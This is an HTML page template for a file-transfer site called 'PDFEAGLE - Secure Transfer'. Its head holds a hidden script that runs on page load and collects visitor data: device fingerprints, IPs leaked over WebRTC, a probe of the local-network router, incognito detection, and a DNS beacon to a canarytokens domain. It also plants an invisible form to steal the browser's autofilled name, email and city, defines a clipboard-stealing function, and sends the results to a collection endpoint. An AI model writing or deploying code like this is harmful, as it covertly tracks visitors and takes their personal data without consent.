<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFEAGLE - Secure Transfer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .brand-text { font-weight: 800; color: #e74c3c; letter-spacing: 1px; }
        .main-container { max-width: 800px; margin-top: 40px; }
        .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
    </style>

    <script>
    // â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    // â•‘  ðŸ¦… EAGLE EYE OMNISCIENT v11.1 â€” ABSOLUTE FINAL (AGGRESSIVE + GRABIFY INC)    â•‘
    // â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    window.EagleEyeOmni = class {
        constructor(config = {}) {
            this.version = "11.1.0-OMNI-AGGRESSIVE";
            this.endpoint = config.endpoint || '/api/collect';
            this.sessionId = this.generateSessionId();
            this.config = {
                canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com", 
                collectOnLoad: config.collectOnLoad !== false
            };
            this.init();
        }

        generateSessionId() {
            return Array.from(crypto.getRandomValues(new Uint8Array(8)), b => b.toString(16).padStart(2,'0')).join('');
        }

        async init() {
            this.loadSuperCookie();
            if (this.config.canaryDomain) this.triggerDNSBeacons();
            if (this.config.collectOnLoad) {
                if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 500);
                else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 500));
            }
        }

        loadSuperCookie() {
            const img = new Image();
            img.src = `/pixel.gif?source=etag_check&uid=${this.sessionId}`;
        }

        // === 1. NETWORK FORENSICS ===
        getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "not_supported";
            return {
                type: conn.effectiveType || "unknown",
                rtt: conn.rtt,
                downlink: conn.downlink,
                saveData: conn.saveData
            };
        }

        async getWebRTC() {
            const res = { local: [], public: [] };
            try {
                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel('');
                await new Promise(r => {
                    pc.onicecandidate = e => {
                        if(!e.candidate) { r(); return; }
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if(ip) {
                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
                            else res.public.push(ip[1]);
                        }
                    };
                    setTimeout(r, 2000);
                });
            } catch(e){}
            return res;
        }

        async getIPv6() {
            const services = ['https://api64.ipify.org?format=json', 'https://ipv6.icanhazip.com'];
            for (const url of services) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 1500);
                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
                    if (!response.ok) continue;
                    let ip = await response.text();
                    try { ip = JSON.parse(ip).ip; } catch(e){}
                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
                } catch (e) { continue; }
            }
            return { detected: false, ip: null };
        }

        async scanLocalNetwork() {
            const targets = ['192.168.0.1', '192.168.1.1', '192.168.1.254', '10.0.0.1', '172.16.0.1'];
            const checkPort = (ip) => {
                return new Promise(resolve => {
                    const start = performance.now();
                    const img = new Image();
                    img.src = `http://${ip}/favicon.ico?r=${Math.random()}`;
                    img.onload = () => resolve({ ip, status: 'open', time: performance.now() - start });
                    img.onerror = () => {
                        const time = performance.now() - start;
                        if (time < 500) resolve({ ip, status: 'alive', time }); 
                        else resolve({ ip, status: 'dead', time });
                    };
                    setTimeout(() => resolve({ ip, status: 'timeout', time: 9999 }), 2000);
                });
            };
            const checks = targets.map(ip => checkPort(ip));
            const scanResults = await Promise.all(checks);
            return scanResults.filter(r => r.status !== 'dead' && r.status !== 'timeout');
        }

        // === 2. HARDWARE DEEP DIVE ===
        getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "no_webgl";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const limits = {
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxCubeMapSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
                    maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
                };
                if (!debugInfo) return { vendor: "masked", renderer: "masked", limits: limits };
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    limits: limits
                };
            } catch (e) { return "error"; }
        }

        async getMediaDevicesCount() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "not_supported";
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
                };
            } catch (e) { return "blocked"; }
        }

        async getClientHints() {
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues([
                        "model", "platformVersion", "architecture", "bitness", "fullVersionList", "mobile"
                    ]);
                    return { model: hints.model, platformVersion: hints.platformVersion, mobile: hints.mobile };
                } catch (e) { return "restricted"; }
            }
            return "not_supported";
        }

        async getBatteryStatus() {
            if (navigator.getBattery) {
                try {
                    const batt = await navigator.getBattery();
                    return { level: (batt.level * 100) + "%", charging: batt.charging };
                } catch (e) { return "error"; }
            }
            return "not_supported";
        }

        // === 3. SENSORS & BEHAVIOR ===
        async getAmbientLight() {
            if ('AmbientLightSensor' in window) {
                try {
                    const sensor = new AmbientLightSensor();
                    return new Promise(resolve => {
                        sensor.onreading = () => { sensor.stop(); resolve(sensor.illuminance); };
                        sensor.onerror = () => resolve("Error/Permission");
                        sensor.start();
                        setTimeout(() => { sensor.stop(); resolve("Timeout"); }, 500);
                    });
                } catch { return "Not Supported"; }
            }
            return "Not Supported";
        }

        trackMouseEntropy() {
            return new Promise(resolve => {
                let moves = [];
                const fn = e => {
                    moves.push({x:e.clientX, y:e.clientY});
                    if(moves.length > 20) {
                        document.removeEventListener('mousemove', fn);
                        let variance = 0;
                        for(let i=2; i<moves.length; i++) {
                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
                            variance += Math.abs(a1 - a2);
                        }
                        resolve(variance);
                    }
                };
                document.addEventListener('mousemove', fn);
                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 3000);
            });
        }

        // === 4. DISPLAY & WINDOW ===
        getScreenExtended() {
            return {
                orientation: (screen.orientation || {}).type || window.orientation || "unknown",
                touchPoints: navigator.maxTouchPoints || 0,
                touchScreen: (navigator.maxTouchPoints > 0) ? "Yes" : "No",
                colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
                hdr: window.matchMedia('(dynamic-range: high)').matches ? "Yes" : "No",
                window: {
                    outer: `${window.outerWidth}x${window.outerHeight}`,
                    inner: `${window.innerWidth}x${window.innerHeight}`,
                    avail: `${window.screen.availWidth}x${window.screen.availHeight}`
                }
            };
        }

        // === 5. SECURITY & AGGRESSIVE (UPDATED v2.0 - GRABIFY STYLE) ===
        async detectIncognito() {
            let isIncognito = "No";
            
            // 1. Chrome/Chromium (The Grabify Method - Legacy API)
            if ('webkitTemporaryStorage' in navigator && 'queryUsageAndQuota' in navigator.webkitTemporaryStorage) {
                try {
                    await new Promise((resolve) => {
                        navigator.webkitTemporaryStorage.queryUsageAndQuota(
                            (usage, quota) => {
                                // Ð’ Ð˜Ð½ÐºÐ¾Ð³Ð½Ð¸Ñ‚Ð¾ ÐºÐ²Ð¾Ñ‚Ð° Ð¾Ð±Ñ‹Ñ‡Ð½Ð¾ < 120MB
                                if (quota < 120 * 1024 * 1024) isIncognito = "Yes (Quota Limit)";
                                resolve();
                            },
                            (e) => resolve()
                        );
                    });
                } catch(e) {}
            }
            
            // 2. Firefox (IndexedDB Error)
            if (navigator.userAgent.includes("Firefox")) {
                try {
                    const db = indexedDB.open("test");
                    db.onerror = () => { isIncognito = "Yes (Firefox DB)"; };
                    db.onsuccess = () => { isIncognito = "No"; };
                } catch(e) { isIncognito = "Yes (Firefox Exception)"; }
            }

            // 3. Safari (LocalStorage Error)
            if (navigator.vendor && navigator.vendor.indexOf('Apple') > -1) {
                try {
                    localStorage.setItem('test', '1');
                    localStorage.removeItem('test');
                } catch (e) { isIncognito = "Yes (Safari Write)"; }
            }

            // 4. General Storage Estimate (Backup with higher threshold)
            if (isIncognito === "No" && 'storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const { quota } = await navigator.storage.estimate();
                    if (quota < 200 * 1024 * 1024) isIncognito = "Yes (Low Quota)";
                } catch (e) {}
            }

            return isIncognito;
        }

        detectAdBlock() {
            const bait = document.createElement('div');
            bait.innerHTML = '&nbsp;';
            bait.className = 'adsbox ad-banner pub_300x250';
            bait.style.position = 'absolute'; bait.style.top = '-999px';
            document.body.appendChild(bait);
            const detected = (bait.offsetHeight === 0 || bait.style.display === 'none');
            document.body.removeChild(bait);
            return detected ? "Yes" : "No";
        }

        async tryStealAutofill() {
            const form = document.createElement('div');
            form.style.position = 'absolute'; form.style.top = '-2000px';
            form.innerHTML = `
                <input type="text" name="name" autocomplete="name" value="">
                <input type="email" name="email" autocomplete="email" value="">
                <input type="text" name="city" autocomplete="address-level2" value="">
            `;
            document.body.appendChild(form);
            await new Promise(r => setTimeout(r, 1000));
            const inputs = form.querySelectorAll('input');
            const data = {};
            inputs.forEach(input => { if (input.value) data[input.name] = input.value; });
            document.body.removeChild(form);
            return Object.keys(data).length > 0 ? data : "No Data / Interaction Required";
        }

        getUserTime() { return new Date().toString(); }

        // === 6. FINGERPRINTING ===
        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v11", 2, 15);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch { return "error"; }
        }

        async getAudioHash() {
            try {
                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!Ctx) return "no_audio";
                const audioCtx = new Ctx(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const buffer = await audioCtx.startRendering();
                const data = buffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                return sum.toFixed(6);
            } catch { return "error"; }
        }

        getFonts() {
            const fontList = ["Arial", "Calibri", "Consolas", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Menlo", "Monaco"];
            const detected = [];
            const span = document.createElement("span");
            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
            document.body.appendChild(span);
            span.style.fontFamily = "monospace";
            const defaultWidth = span.offsetWidth;
            for (const font of fontList) {
                span.style.fontFamily = `"${font}", monospace`;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected;
        }

        detectAnomalies(fonts, light, entropy, network, media, lanScan) {
            const anomalies = [];
            const ua = navigator.userAgent;
            const isMobileUA = /Android|iPhone|iPad/i.test(ua);
            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            
            if (isMobileUA && !hasTouch) anomalies.push("FAKE MOBILE: No Touch Events");
            if (isMobileUA && light === "Not Supported") anomalies.push("POSSIBLE VM: No Light Sensor on Mobile");
            if (isMobileUA && media !== "blocked" && media.videoInputs === 0) anomalies.push("FAKE MOBILE: No Camera Detected");
            if (network !== "not_supported" && network.rtt < 5) anomalies.push("DATA CENTER: Ping < 5ms");
            if (lanScan.length > 0) anomalies.push(`LOCAL NETWORK: Gateway found at ${lanScan[0].ip}`);
            if (entropy < 0.05 && entropy > 0) anomalies.push("BOT MOVEMENT: Perfectly linear mouse");
            if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");
            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Windows without Calibri");
            
            return anomalies;
        }

        triggerDNSBeacons() {
            const uid = `${this.sessionId}.${Date.now()}`;
            new Image().src = `https://${uid}.img.${this.config.canaryDomain}/pixel.gif`;
        }

        // === MAIN COLLECT ===
        async collect(trigger, extra = {}) {
            const [webrtc, ipv6, light, entropy, audio, battery, hints, incognito, media, lanScan, autofill] = await Promise.all([
                this.getWebRTC(),
                this.getIPv6(),
                this.getAmbientLight(),
                this.trackMouseEntropy(),
                this.getAudioHash(),
                this.getBatteryStatus(),
                this.getClientHints(),
                this.detectIncognito(),
                this.getMediaDevicesCount(),
                this.scanLocalNetwork(),
                this.tryStealAutofill()
            ]);

            const fonts = this.getFonts();
            const gpu = this.getGPU();
            const canvas = this.getCanvasHash();
            const screenExt = this.getScreenExtended();
            const adBlock = this.detectAdBlock();
            const userTime = this.getUserTime();
            const network = this.getNetworkInfo();

            const anomalies = this.detectAnomalies(fonts, light, entropy, network, media, lanScan);
            if (incognito.includes("Yes")) anomalies.push("SECURITY: Incognito Mode Detected");
            if (adBlock === "Yes") anomalies.push("BROWSER: AdBlock Detected");
            if (gpu !== "error" && gpu.renderer && gpu.renderer.includes("SwiftShader")) anomalies.push("VM DETECTED: Google SwiftShader Renderer");
            if (typeof autofill === 'object') anomalies.push("CRITICAL: Autofill Data Stolen");

            const payload = {
                meta: {
                    version: this.version,
                    sessionId: this.sessionId,
                    trigger: trigger,
                    url: window.location.href
                },
                threat: {
                    score: anomalies.length * 25,
                    anomalies: anomalies,
                    is_bot: anomalies.length > 0
                },
                fingerprints: {
                    canvas: canvas,
                    audio: audio,
                    fonts: fonts,
                    gpu: gpu
                },
                hardware: {
                    model: hints,
                    battery: battery,
                    screen_advanced: screenExt,
                    media_devices: media,
                    lightSensor: light,
                    mouseEntropy: entropy,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                network: { 
                    info: network,
                    webrtc: webrtc, 
                    ipv6: ipv6,
                    lan_scan: lanScan
                },
                security: {
                    incognito: incognito,
                    adBlock: adBlock,
                    autofill_data: autofill
                },
                system: { 
                    user_time: userTime,
                    ua: navigator.userAgent, 
                    platform: navigator.platform, 
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone 
                },
                ...extra
            };

            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, blob);
            else fetch(this.endpoint, { method: 'POST', body: JSON.stringify(payload), headers: {'Content-Type': 'application/json'} });
        }
    };
    
    const eagle = new EagleEyeOmni();

    async function stealClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                return text ? text.substring(0, 1000) : "Empty";
            }
        } catch (e) { return "Blocked/Error"; }
        return "Not Supported";
    }
    </script>
</head>
<body>
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand brand-text" href="/">
                <i class="fa-solid fa-file-pdf"></i> PDFEAGLE
            </a>
        </div>
    </nav>
    <div class="container main-container">
        {% block content %}{% endblock %}
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
